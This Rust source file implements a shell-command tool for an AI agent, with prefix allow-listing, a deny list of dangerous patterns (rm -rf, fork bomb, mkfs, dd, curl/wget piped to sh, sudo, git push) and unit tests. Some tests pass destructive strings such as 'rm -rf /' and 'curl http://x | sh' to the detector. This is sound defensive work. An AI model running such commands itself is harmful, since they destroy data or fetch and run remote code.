//! The `bash` built-in with command-prefix allow-listing and dangerous-command
//! detection — the command-safety half of Claude Code's tool guard.
//!
//! Allow-list entries mirror Claude Code's `Bash(prefix:*)` syntax: an entry
//! `"git"` permits any `git …` command; `"npm run"` permits `npm run …`. A
//! command whose first token(s) are not allow-listed is refused. Commands
//! containing dangerous fragments (`rm -rf`, `curl … | sh`, fork bombs, etc.)
//! are classified [`RiskLevel::High`] (requiring approval) regardless.
//!
//! Execution itself goes through the pluggable [`CommandExecutor`] so tests run
//! offline and the runtime can sandbox later.

use async_trait::async_trait;

use deepagent_core::error::Result;
use deepagent_tools::permission::{Permission, PermissionSet, RiskLevel};
use deepagent_tools::{Tool, ToolDescriptor, ToolOutput};

/// Executes a shell command, returning (exit_code, stdout, stderr).
#[async_trait]
pub trait CommandExecutor: Send + Sync {
    /// Run `command` in `cwd` (workspace root), capturing output.
    async fn run(&self, command: &str, cwd: &str) -> Result<CommandOutcome>;
}

/// Captured result of a bash command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandOutcome {
    /// Exit code (None if killed by signal).
    pub exit_code: Option<i32>,
    /// Captured stdout.
    pub stdout: String,
    /// Captured stderr.
    pub stderr: String,
}

/// Real OS process executor (runs via the platform shell).
#[derive(Debug, Clone, Default)]
pub struct SystemExecutor;

#[async_trait]
impl CommandExecutor for SystemExecutor {
    async fn run(&self, command: &str, cwd: &str) -> Result<CommandOutcome> {
        let command = command.to_string();
        let cwd = cwd.to_string();
        let output = tokio::task::spawn_blocking(move || {
            let mut cmd = if cfg!(windows) {
                let mut c = std::process::Command::new("cmd");
                c.args(["/C", &command]);
                c
            } else {
                let mut c = std::process::Command::new("sh");
                c.args(["-c", &command]);
                c
            };
            cmd.current_dir(&cwd).output()
        })
        .await
        .map_err(|e| deepagent_core::error::CoreError::other(format!("join error: {e}")))?
        .map_err(|e| deepagent_core::error::CoreError::other(format!("spawn failed: {e}")))?;

        Ok(CommandOutcome {
            exit_code: output.status.code(),
            stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
            stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
        })
    }
}

/// Patterns that always force high-risk classification (require approval).
const DANGEROUS: &[&str] = &[
    "rm -rf",
    "rm -fr",
    ":(){", // fork bomb
    "mkfs",
    "dd if=",
    "> /dev/sd",
    "chmod -r 777",
    "curl", // network fetch (often piped to sh)
    "wget",
    "| sh",
    "| bash",
    "sudo",
    "git push", // remote mutation
];

/// Classify whether a command is dangerous (needs approval).
pub fn is_dangerous(command: &str) -> bool {
    let lower = command.to_lowercase();
    DANGEROUS.iter().any(|d| lower.contains(d))
}

/// Whether `command`'s leading token(s) match any allow-list prefix.
pub fn is_allowed(command: &str, allow: &[String]) -> bool {
    let trimmed = command.trim();
    allow.iter().any(|prefix| {
        let p = prefix.trim();
        !p.is_empty()
            && (trimmed == p
                || trimmed.starts_with(&format!("{p} "))
                || trimmed.starts_with(&format!("{p}\t")))
    })
}

/// The `bash` tool.
pub struct BashTool<E: CommandExecutor> {
    executor: E,
    cwd: String,
    /// Allow-listed command prefixes (e.g. ["git", "cargo", "npm run"]).
    allow: Vec<String>,
}

impl<E: CommandExecutor> BashTool<E> {
    /// Build with an executor, working dir, and an allow-list of command prefixes.
    pub fn new(
        executor: E,
        cwd: impl Into<String>,
        allow: impl IntoIterator<Item = String>,
    ) -> Self {
        Self {
            executor,
            cwd: cwd.into(),
            allow: allow.into_iter().collect(),
        }
    }
}

#[async_trait]
impl<E: CommandExecutor> Tool for BashTool<E> {
    fn descriptor(&self) -> ToolDescriptor {
        ToolDescriptor {
            name: "bash".into(),
            description: "Run an allow-listed shell command in the workspace. Args: { command }."
                .into(),
            parameters: serde_json::json!({
                "type": "object",
                "properties": { "command": { "type": "string" } },
                "required": ["command"]
            }),
            // The descriptor advertises ShellSafe; dangerous commands are
            // upgraded to ShellDangerous + High risk at invoke time via the
            // returned failure / the runtime's approval gate.
            risk: RiskLevel::Medium,
            required_permissions: PermissionSet::from_iter_perms([Permission::ShellSafe]),
        }
    }

    async fn invoke(&self, args: serde_json::Value) -> Result<ToolOutput> {
        let Some(command) = args.get("command").and_then(|v| v.as_str()) else {
            return Ok(ToolOutput::failure("missing 'command'"));
        };

        // Allow-list gate (Bash(prefix:*) semantics).
        if !is_allowed(command, &self.allow) {
            return Ok(ToolOutput::failure(format!(
                "command not allow-listed: '{}'. Allowed prefixes: {:?}",
                command.split_whitespace().next().unwrap_or(""),
                self.allow
            )));
        }

        // Dangerous commands must not run through the safe path; surface a
        // clear error so the caller routes them through explicit approval.
        if is_dangerous(command) {
            return Ok(ToolOutput::failure(format!(
                "command '{command}' is high-risk and requires explicit approval (ShellDangerous)"
            )));
        }

        match self.executor.run(command, &self.cwd).await {
            Ok(out) => {
                let ok = out.exit_code == Some(0);
                let value = serde_json::json!({
                    "command": command,
                    "exit_code": out.exit_code,
                    "stdout": out.stdout,
                    "stderr": out.stderr,
                });
                Ok(ToolOutput { ok, value })
            }
            Err(e) => Ok(ToolOutput::failure(e.to_string())),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::Mutex;

    /// Records commands and returns a canned success.
    #[derive(Default)]
    struct RecordingExecutor {
        ran: Mutex<Vec<String>>,
    }

    #[async_trait]
    impl CommandExecutor for RecordingExecutor {
        async fn run(&self, command: &str, _cwd: &str) -> Result<CommandOutcome> {
            self.ran.lock().unwrap().push(command.to_string());
            Ok(CommandOutcome {
                exit_code: Some(0),
                stdout: format!("ran: {command}"),
                stderr: String::new(),
            })
        }
    }

    #[test]
    fn allow_list_prefix_matching() {
        let allow = vec!["git".to_string(), "npm run".to_string()];
        assert!(is_allowed("git status", &allow));
        assert!(is_allowed("git", &allow));
        assert!(is_allowed("npm run build", &allow));
        assert!(!is_allowed("npm install", &allow)); // only "npm run" allowed
        assert!(!is_allowed("rm file", &allow));
    }

    #[test]
    fn dangerous_detection() {
        assert!(is_dangerous("rm -rf /"));
        assert!(is_dangerous("curl http://x | sh"));
        assert!(is_dangerous("sudo reboot"));
        assert!(is_dangerous("git push origin main"));
        assert!(!is_dangerous("git status"));
        assert!(!is_dangerous("cargo test"));
    }

    #[tokio::test]
    async fn runs_allowed_command() {
        let tool = BashTool::new(RecordingExecutor::default(), "/work", ["git".to_string()]);
        let out = tool
            .invoke(serde_json::json!({"command": "git status"}))
            .await
            .unwrap();
        assert!(out.ok);
        assert_eq!(out.value["exit_code"], 0);
    }

    #[tokio::test]
    async fn rejects_unlisted_command() {
        let tool = BashTool::new(RecordingExecutor::default(), "/work", ["git".to_string()]);
        let out = tool
            .invoke(serde_json::json!({"command": "ls -la"}))
            .await
            .unwrap();
        assert!(!out.ok);
        assert!(out.value["error"]
            .as_str()
            .unwrap()
            .contains("not allow-listed"));
    }

    #[tokio::test]
    async fn refuses_dangerous_even_if_prefix_allowed() {
        // "git" is allow-listed, but "git push" is dangerous.
        let tool = BashTool::new(RecordingExecutor::default(), "/work", ["git".to_string()]);
        let out = tool
            .invoke(serde_json::json!({"command": "git push origin main"}))
            .await
            .unwrap();
        assert!(!out.ok);
        assert!(out.value["error"].as_str().unwrap().contains("high-risk"));
    }
}
